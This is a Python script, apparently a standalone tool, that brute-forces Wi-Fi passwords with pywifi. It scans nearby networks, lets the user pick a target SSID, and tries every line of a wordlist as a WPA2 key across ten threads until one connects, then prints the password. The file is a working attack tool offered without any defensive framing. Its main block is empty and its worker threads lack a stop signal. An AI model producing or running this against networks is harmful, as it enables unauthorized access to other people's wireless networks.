import pywifi
import time
from colorama import Fore, Style
import threading
from queue import Queue

class Bruteforcer:
    def __init__(self, interface, wordlist):
        self.interface = interface
        self.wordlist = wordlist
        self.wifi = pywifi.PyWiFi()
        self.iface = self.wifi.interfaces()[0]
        self.queue = Queue()
        self.lock = threading.Lock()
        self.correct_password = None

    def scan_networks(self):
        self.iface.scan()
        time.sleep(2)
        networks = self.iface.scan_results()
        return networks

    def brute_force(self, ssid):
        with open(self.wordlist, "r") as f:
            passwords = f.readlines()
        for password in passwords:
            self.queue.put(password.strip())

        threads = []
        for _ in range(10):  # Create 10 threads
            thread = threading.Thread(target=self.try_password, args=(ssid,))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

        if self.correct_password:
            with self.lock:
                print(f"{Fore.GREEN}Password found and it is: {self.correct_password}{Style.RESET_ALL}")
        else:
            with self.lock:
                print(f"{Fore.RED}Password not found{Style.RESET_ALL}")

    def try_password(self, ssid):
        while True:
            password = self.queue.get()
            if password is None:
                break
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = pywifi.const.AUTH_ALG_OPEN
            profile.akm = [pywifi.const.AKM_TYPE_WPA2PSK]
            profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
            profile.key = password
            self.iface.remove_all_network_profiles()
            tmp_profile = self.iface.add_network_profile(profile)
            self.iface.connect(tmp_profile)
            time.sleep(2)
            if self.iface.status() == pywifi.const.IFACE_CONNECTED:
                with self.lock:
                    self.correct_password = password
                break
            else:
                with self.lock:
                    print(f"{Fore.CYAN}Trying password: {password}{Style.RESET_ALL}")
                self.iface.disconnect()
            self.queue.task_done()
            time.sleep(0.1)  # Add a delay between each password attempt

    def start(self):
        print(f"{Fore.YELLOW}Scanning for available networks...{Style.RESET_ALL}")
        networks = self.scan_networks()
        print(f"{Fore.YELLOW}Available networks:{Style.RESET_ALL}")
        for i, network in enumerate(networks):
            print(f"{i+1}. {network.ssid}")
        choice = input(f"{Fore.CYAN}Enter the number of the network to brute force: {Style.RESET_ALL}")
        choice = int(choice) - 1
        ssid = networks[choice].ssid
        print(f"{Fore.YELLOW}Brute forcing {ssid}...{Style.RESET_ALL}")
        self.brute_force(ssid)

if __name__ == "__main__":
    pass